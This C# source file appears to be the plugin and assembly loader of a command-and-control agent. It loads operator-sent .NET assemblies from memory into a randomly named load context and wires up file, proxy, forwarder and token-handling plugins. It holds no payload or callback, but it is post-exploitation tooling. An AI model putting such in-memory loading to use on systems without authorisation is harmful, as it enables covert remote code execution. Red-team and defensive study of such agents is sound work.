﻿using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;
using System.Reflection;
using System.Runtime.Loader;

namespace Agent.Managers
{
    public class AssemblyManager : IAssemblyManager
    {
        private ConcurrentDictionary<string, IPlugin> loadedPlugins = new ConcurrentDictionary<string, IPlugin>();
        private AssemblyLoadContext loadContext = new AssemblyLoadContext(Misc.RandomString(10));
        private ILogger logger { get; set; }
        private IMessageManager messageManager { get; set; }
        private IAgentConfig agentConfig { get; set; }
        private ITokenManager tokenManager { get; set; }
        public AssemblyManager(IMessageManager messageManager, ILogger logger, IAgentConfig agentConfig, ITokenManager tokenManager) {
            this.logger = logger;
            this.messageManager = messageManager;
            this.agentConfig= agentConfig;
            this.tokenManager = tokenManager;
        }
        
        private bool TryLoadPlugin(string name)
        {
            try
            {
                logger.Log("Attempting to load plugin: " + name);
                Assembly _tasksAsm = Assembly.Load($"{name}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");

                if(_tasksAsm is null)
                {
                    logger.Log("Failed to load plugin. _tasksAsm is null.");
                    return false;
                }

                logger.Log("Loaded plugin assembly, searching for interfaces.");
                return this.ParseAssemblyForPlugin(_tasksAsm);
            }
            catch (Exception e)
            {
                logger.Log(e.ToString());
            }

            return false;
        }
        public bool TryGetPlugin(string name, out IPlugin? plugin)
        {
            //Either get the plugin, or attempt to load it
            if (loadedPlugins.ContainsKey(name) || TryLoadPlugin(name))
            {
                plugin = loadedPlugins[name];
                return true;
            }

            plugin = null;
            return false;
        }
        public bool TryGetPlugin(string name, out IFilePlugin? plugin)
        {
            IPlugin plug = null;
            if (!TryGetPlugin(name, out plug))
            {
                plugin = null;
                return false;
            }

            if (plug is IFilePlugin)
            {
                logger.Log("Found File Plugin.");
                plugin = (IFilePlugin)plug;
                return true;
            }

            logger.Log("File plugin not found.");
            plugin = null;
            return false;
        }
        public bool TryGetPlugin(string name, out IProxyPlugin? plugin)
        {
            IPlugin plug = null;
            if (!TryGetPlugin(name, out plug))
            {
                plugin = null;
                return false;
            }


            if (plug is IProxyPlugin)
            {
                logger.Log("Found Proxy Plugin.");
                plugin = (IProxyPlugin)plug;
                return true;
            }
            logger.Log("Proxy plugin not found.");
            plugin = null;
            return false;

        }
        public bool TryGetPlugin(string name, out IForwarderPlugin? plugin)
        {
            IPlugin plug = null;
            if (!TryGetPlugin(name, out plug))
            {
                plugin = null;
                return false;
            }


            if (plug is IForwarderPlugin)
            {
                logger.Log("Found Forwarder Plugin.");
                plugin = (IForwarderPlugin)plug;
                return true;
            }

            logger.Log("Forwarder plugin not found.");
            plugin = null;
            return false;
        }
        public bool LoadAssemblyAsync(string task_id, byte[] buf)
        {
            try
            {
                var loadedAssembly = this.loadContext.LoadFromStream(new MemoryStream(buf));
                messageManager.AddResponse(new ResponseResult
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x19" } },
                    completed = true
                });
                return true;
            }
            catch (Exception e)
            {
                messageManager.AddResponse(new ResponseResult
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x19" } },
                    completed = true,
                    user_output = e.ToString(),
                    status = "error",
                });
            }
            return false;
        }
        public bool LoadPluginAsync(string task_id, string pluginName, byte[] buf)
        {
            try {
                var loadedAssembly = this.loadContext.LoadFromStream(new MemoryStream(buf));

                if (this.loadedPlugins.ContainsKey(pluginName))
                {
                    this.messageManager.AddResponse(new LoadCommandResponseResult
                    {
                        completed = true,
                        process_response = new Dictionary<string, string> { { "message", "0x1C" } },
                        task_id = task_id,
                        status = "error"
                    });
                    return false;
                }

                if (this.ParseAssemblyForPlugin(loadedAssembly))
                {
                    LoadCommandResponseResult cr = new LoadCommandResponseResult()
                    {
                        completed = true,
                        process_response = new Dictionary<string, string> { { "message", "0x1D" } },
                        task_id = task_id,
                        commands = new List<CommandsResponse>()
                                {
                                    new CommandsResponse()
                                    {
                                        action = "add",
                                        cmd = pluginName,
                                    }
                                }
                    };
                    this.messageManager.AddResponse(cr);
                    return true;
                }
            }
            catch (Exception e)
            {
                logger.Log(e.ToString());
                this.messageManager.AddResponse(new LoadCommandResponseResult
                {
                    completed = true,
                    process_response = new Dictionary<string, string> { { "message", "0x1C" } },
                    task_id = task_id,
                    status = "error",
                    user_output = e.ToString()
                });
            }

            return false;
        }
        private bool ParseAssemblyForPlugin(Assembly asm)
        {
            foreach (Type t in asm.GetTypes())
            {
                if (typeof(IPlugin).IsAssignableFrom(t))
                {
                    IPlugin plug = (IPlugin)Activator.CreateInstance(t, messageManager, agentConfig, logger, tokenManager);
                    
                    this.loadedPlugins.GetOrAdd(plug.Name, plug);

                    return true;
                }
            }
            return false;
        }
    }
}